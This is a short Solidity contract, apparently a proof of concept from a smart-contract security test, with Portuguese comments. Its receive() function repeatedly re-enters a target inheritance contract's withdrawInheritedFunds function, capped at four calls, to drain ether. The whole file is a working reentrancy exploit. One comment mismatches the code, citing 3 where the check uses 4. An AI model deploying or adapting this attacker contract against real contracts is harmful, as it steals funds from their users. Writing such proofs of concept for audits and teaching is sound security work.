pragma solidity ^0.8.0;

contract MaliciousBeneficiary {
    address public owner;
    address public inheritanceContract;
    uint256 public callCount; // Contador de chamadas
    uint256 public totalReceived; // Armazena o total de ether recebido

    constructor(address _inheritanceContract) {
        owner = msg.sender;
        inheritanceContract = _inheritanceContract;
        callCount = 0; // Inicializa o contador
        totalReceived = 0; // Inicializa o valor total recebido
    }

    receive() external payable {
        // Se o contador for maior ou igual a 3, não faz mais chamadas
        if (callCount >= 4) {
            return; // Interrompe o loop sem reverter a transação
        }

        // Incrementa o contador a cada chamada
        callCount++;

        // Adiciona o valor recebido ao totalReceived
        totalReceived += msg.value;

        // Invoca novamente a função de herança
        (bool success,) =
            inheritanceContract.call(abi.encodeWithSignature("withdrawInheritedFunds(address)", address(0)));
        require(success, "Reentrancy attack failed");
    }
}
